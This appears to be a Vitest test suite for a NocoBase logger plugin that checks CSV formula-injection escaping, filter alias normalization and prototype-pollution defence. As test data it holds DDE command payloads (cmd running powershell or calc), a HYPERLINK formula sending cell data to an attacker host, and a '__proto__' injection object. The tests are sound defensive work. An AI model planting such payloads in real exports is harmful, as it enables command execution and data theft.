import { describe, test, expect, beforeAll, afterAll } from 'vitest';
import { MockServer, createMockServer } from '@nocobase/test';
import PluginLoggerProServer from '../index';
import {
  AuditExportService,
  normalizeFilter,
  LEGACY_FIELD_ALIASES,
  ALL_AUDIT_EXPORT_FIELDS,
} from '../services/audit-export.service';

/**
 * 构造轻量 Mock Koa Context，用于快速单元与边界测试
 */
function createMockKoaContext(params: any = {}) {
  const headers: Record<string, string> = {};
  return {
    params,
    query: params,
    request: { query: params, body: params },
    headers,
    set(key: string, val: string) {
      headers[key.toLowerCase()] = val;
    },
    get(key: string) {
      return headers[key.toLowerCase()];
    },
    attachment(filename: string) {
      headers['content-disposition'] = `attachment; filename="${filename}"`;
    },
    throw(status: number, message: string) {
      const err = new Error(message) as any;
      err.status = status;
      throw err;
    },
    body: null as any,
    status: 200,
  } as any;
}

/**
 * 构造 Mock Repository
 */
function createMockRepo(records: any[]) {
  return {
    find: async (opts: any = {}) => {
      let filtered = [...records];
      if (opts.filter?.id?.$gt) {
        filtered = filtered.filter((r) => r.id > opts.filter.id.$gt);
      }
      const limit = opts.limit || filtered.length;
      return filtered.slice(0, limit);
    },
  };
}

describe('Challenger M4-1: CSV Injection Fuzzing & Filter Normalization Suite', () => {
  // =========================================================================
  // 1. CSV 公式注入防御 Fuzzing 实证测试 (Formula Injection Fuzzing)
  // =========================================================================
  describe('1. CSV 公式注入 Fuzzing 矩阵与边界实证', () => {
    test('1.1 单字符与极端短 payload 注入防御 (=, +, -, @, \\t, \\r)', async () => {
      const payloads = [
        { key: 'userUsername', val: '=' },
        { key: 'userNickname', val: '+' },
        { key: 'ip', val: '-' },
        { key: 'userAgent', val: '@' },
        { key: 'method', val: '\t' },
        { key: 'path', val: '\r' },
        { key: 'collectionName', val: '=1+1' },
        { key: 'actionName', val: '+123' },
        { key: 'recordId', val: '-5' },
        { key: 'errorMessage', val: '@import' },
        { key: 'params', val: '\tmalicious' },
        { key: 'diff', val: '\r\n=1' },
      ];

      const record: any = { id: 1 };
      for (const p of payloads) {
        record[p.key] = p.val;
      }

      const mockApp: any = {
        db: {
          getRepository: () => createMockRepo([record]),
        },
      };
      const service = new AuditExportService(mockApp);
      const ctx = createMockKoaContext();

      await service.exportLogs(ctx, {
        format: 'csv',
        fields: payloads.map((p) => p.key),
      });

      const csv = ctx.body as string;

      // 验证首行是 UTF-8 BOM
      expect(csv.charCodeAt(0)).toBe(0xfeff);
      expect(csv.startsWith('\uFEFF')).toBe(true);

      // 验证每一个恶意 payload 是否都被加上了单引号转义
      expect(csv).toContain('\'=');
      expect(csv).toContain('\'+');
      expect(csv).toContain('\'-');
      expect(csv).toContain('\'@');
      expect(csv).toContain('\'\t');
      expect(csv).toContain('\'\r');
      expect(csv).toContain('\'=1+1');
      expect(csv).toContain('\'+123');
      expect(csv).toContain('\'-5');
      expect(csv).toContain('\'@import');
      expect(csv).toContain('\'\tmalicious');
      expect(csv).toContain('\'\r\n=1');
    });

    test('1.2 复合混淆 payload (换行、制表符、双引号、UTF-8 奇怪字符)', async () => {
      const confusedPayloads = [
        '=cmd|\' /C powershell -enc JABPAD0... \'!A0',
        '+cmd|\' /C calc\'!A0',
        '-2+3+cmd|\' /C calc\'!A0',
        '@SUM(1+1)*cmd|\' /C calc\'!A0',
        '\t\t\t=HYPERLINK("http://evil.example.com", "Click Here")',
        '\r\n@SUM(1,2)',
        '==++--@@\t\r',
        '=1+1\r\n=2+2',
        '"=cmd|calc"',
        '=HYPERLINK("http://attacker.com?leak="&A1, "Error Check")',
        '＝SUM(1,2)', // 全角等号，验证不被意外破坏
        '➕100', // Emoji，验证不被意外破坏
      ];

      const records = confusedPayloads.map((payload, idx) => ({
        id: idx + 1,
        userUsername: payload,
      }));

      const mockApp: any = {
        db: {
          getRepository: () => createMockRepo(records),
        },
      };
      const service = new AuditExportService(mockApp);
      const ctx = createMockKoaContext();

      await service.exportLogs(ctx, {
        format: 'csv',
        fields: ['userUsername'],
      });

      const csv = ctx.body as string;

      // 验证所有危险字符开头的混淆 payload 全部被加上了前缀单引号转义
      expect(csv).toContain('\'=cmd|');
      expect(csv).toContain('\'+cmd|');
      expect(csv).toContain('\'-2+3+cmd|');
      expect(csv).toContain('\'@SUM(1+1)*cmd|');
      expect(csv).toContain('\'\t\t\t=HYPERLINK');
      expect(csv).toContain('\'\r\n@SUM(1,2)');
      expect(csv).toContain('\'==++--@@');
      expect(csv).toContain('\'=1+1');
      // 检查全角等号和 Emoji 保持原样不被破坏
      expect(csv).toContain('＝SUM(1,2)');
      expect(csv).toContain('➕100');
    });

    test('1.3 多种数据类型安全验证 (布尔、数字、Date、未定义、空对象)', async () => {
      const records = [
        {
          id: 1,
          userUsername: 'normal_user',
          statusCode: 200,
          durationMs: 0,
          ip: null,
          userAgent: undefined,
          createdAt: new Date('2026-11-13T10:00:00Z'),
          diff: {},
          beforeData: { a: 1, b: 'safe_text' },
        },
      ];

      const mockApp: any = {
        db: {
          getRepository: () => createMockRepo(records),
        },
      };
      const service = new AuditExportService(mockApp);
      const ctx = createMockKoaContext();

      await service.exportLogs(ctx, {
        format: 'csv',
        fields: ['userUsername', 'statusCode', 'durationMs', 'ip', 'userAgent', 'createdAt', 'diff', 'beforeData'],
      });

      const csv = ctx.body as string;
      const rows = csv.split('\r\n');
      const dataRow = rows[1];

      // 正常字符串不转义
      expect(dataRow).toContain('"normal_user"');
      expect(dataRow).not.toContain('\'normal_user');
      // 数字 200 与 0
      expect(dataRow).toContain('"200"');
      expect(dataRow).toContain('"0"');
      // 空对象 diff 显示为 "无变更"
      expect(dataRow).toContain('"无变更"');
      // null 和 undefined 显示为空字符串
      expect(dataRow).toContain('"",');
    });
  });

  // =========================================================================
  // 2. normalizeFilter 深度递归与压力测试
  // =========================================================================
  describe('2. normalizeFilter 深度递归与极端 AST 压力测试', () => {
    test('2.1 超深递归压力测试 (15层逻辑操作符嵌套树)', () => {
      // 构造 15 层的深层嵌套：$and -> $or -> $and -> ... -> { username: { $like: '%adversarial_target%' } }
      let deepAst: any = {
        username: { $like: '%adversarial_target%' },
        diffSummary: 'diff_target',
      };

      for (let i = 0; i < 15; i++) {
        if (i % 2 === 0) {
          deepAst = { $and: [deepAst, { statusCode: 200 }] };
        } else {
          deepAst = { $or: [deepAst, { ip: '127.0.0.1' }] };
        }
      }

      // 执行递归规范化，断言无堆栈溢出
      const normalized = normalizeFilter(deepAst);
      expect(normalized).toBeDefined();

      // 遍历定位最深层叶子节点
      let cursor = normalized;
      for (let i = 0; i < 15; i++) {
        if (i % 2 === 0) {
          expect(cursor.$and).toBeDefined();
          cursor = cursor.$and[0];
        } else {
          expect(cursor.$or).toBeDefined();
          cursor = cursor.$or[0];
        }
      }

      // 验证最深层叶子节点的别名已完成精确映射，且操作符及原始值完好保留
      expect(cursor.userUsername).toEqual({ $like: '%adversarial_target%' });
      expect(cursor.diff).toBe('diff_target');
      expect(cursor.username).toBeUndefined();
      expect(cursor.diffSummary).toBeUndefined();
    });

    test('2.2 多别名、多操作符复合混合 AST 测试', () => {
      const complexAst = {
        $and: [
          { username: { $in: ['admin', 'root'] } },
          { nickname: { $like: '%Super%' } },
          { ua: { $includes: 'Mozilla' } },
          { diffSummary: { $ne: null } },
          { previousData: { $exists: true } },
          { newData: { $ne: {} } },
        ],
        $or: [
          { statusCode: { $between: [200, 299] } },
          { durationMs: { $gt: 1000 } },
        ],
      };

      const result = normalizeFilter(complexAst);

      expect(result).toEqual({
        $and: [
          { userUsername: { $in: ['admin', 'root'] } },
          { userNickname: { $like: '%Super%' } },
          { userAgent: { $includes: 'Mozilla' } },
          { diff: { $ne: null } },
          { beforeData: { $exists: true } },
          { afterData: { $ne: {} } },
        ],
        $or: [
          { statusCode: { $between: [200, 299] } },
          { durationMs: { $gt: 1000 } },
        ],
      });
    });

    test('2.3 原型链与原型污染防御测试', () => {
      const maliciousPayload = JSON.parse('{"__proto__": {"polluted": "yes"}, "username": "attacker"}');
      const normalized = normalizeFilter(maliciousPayload);

      // 验证未造成原型污染
      expect((Object.prototype as any).polluted).toBeUndefined();
      expect(normalized.userUsername).toBe('attacker');
      expect(normalized.username).toBeUndefined();
    });

    test('2.4 空数组、空对象与畸形数据容错', () => {
      expect(normalizeFilter({})).toEqual({});
      expect(normalizeFilter([])).toEqual([]);
      expect(normalizeFilter([[], {}])).toEqual([[], {}]);

      const messyAst = {
        $and: [null, undefined, 42, 'string', false, new Date('2026-11-13T00:00:00Z')],
        username: 'normal',
      };
      const cleaned = normalizeFilter(messyAst);
      expect(cleaned.userUsername).toBe('normal');
      expect(cleaned.$and[0]).toBeNull();
      expect(cleaned.$and[1]).toBeUndefined();
      expect(cleaned.$and[2]).toBe(42);
      expect(cleaned.$and[3]).toBe('string');
      expect(cleaned.$and[4]).toBe(false);
      expect(cleaned.$and[5] instanceof Date).toBe(true);
    });

    test('2.5 已规范化字段的幂等性 (再次处理不发生循环或被破坏)', () => {
      const alreadyNormalized = {
        userUsername: 'already_normalized_user',
        userNickname: 'already_nick',
        userAgent: 'Chrome',
        diff: 'none',
        beforeData: { a: 1 },
        afterData: { a: 2 },
      };

      const result = normalizeFilter(alreadyNormalized);
      expect(result).toEqual(alreadyNormalized);
    });
  });

  // =========================================================================
  // 3. MockServer 真实数据库端到端对抗性实证
  // =========================================================================
  describe('3. MockServer 真实数据库端到端注入对抗', () => {
    let app: MockServer;
    let plugin: PluginLoggerProServer;

    beforeAll(async () => {
      app = await createMockServer({
        plugins: [[PluginLoggerProServer, { name: 'logger-pro' }]],
        resourcer: {
          prefix: '/api',
        },
      });

      await app.load();
      await app.db.sync();
      plugin = app.pm.get(PluginLoggerProServer) as PluginLoggerProServer;

      // 插入一条恶意公式注入记录
      const auditRepo = app.db.getRepository('logger_audit_logs');
      await auditRepo.create({
        values: {
          reqId: '=cmd|\' /C calc\'!A0',
          userUsername: '+injectedadmin',
          userNickname: '-maliciousnickname',
          collectionName: '@evilcollection',
          actionName: '\tmaliciousaction',
          statusCode: 200,
          ip: '\r127.0.0.1',
          method: 'POST',
          path: '/api/test:inject',
        },
      });
    });

    afterAll(async () => {
      if (app) {
        if (plugin?.retentionService) {
          plugin.retentionService.stopScheduler();
        }
        try {
          if (app.db) {
            await app.db.clean({ drop: true });
          }
          await app.destroy();
        } catch (e) {
          // ignore cleanup error
        }
      }
    });

    test('3.1 端到端通过 API 导出并用别名检索注入记录，验证 CSV 输出全量防御', async () => {
      const res = await app.agent().post('/api/loggerPro:exportAuditLogs').send({
        format: 'csv',
        filter: {
          username: { $includes: 'injectedadmin' },
        },
        fields: ['reqId', 'userUsername', 'userNickname', 'collectionName', 'actionName', 'ip'],
      });

      expect(res.status).toBe(200);
      const csv = res.text;

      // 验证 BOM 头
      expect(csv.charCodeAt(0)).toBe(0xfeff);

      // 验证所有字段的注入前缀均已被安全转义单引号包裹
      expect(csv).toContain('\'=cmd|\' /C calc\'!A0');
      expect(csv).toContain('\'+injectedadmin');
      expect(csv).toContain('\'-maliciousnickname');
      expect(csv).toContain('\'@evilcollection');
      expect(csv).toContain('\'\tmaliciousaction');
      expect(csv).toContain('\'\r127.0.0.1');
    });

    test('3.2 复合别名 $and 查询真实数据库注入记录', async () => {
      const res = await app.agent().post('/api/loggerPro:exportAuditLogs').send({
        format: 'csv',
        filter: {
          $and: [
            { username: '+injectedadmin' },
            { nickname: '-maliciousnickname' },
          ],
        },
        fields: ['userUsername', 'userNickname'],
      });

      expect(res.status).toBe(200);
      const csv = res.text;
      expect(csv).toContain('\'+injectedadmin');
      expect(csv).toContain('\'-maliciousnickname');
    });
  });
});
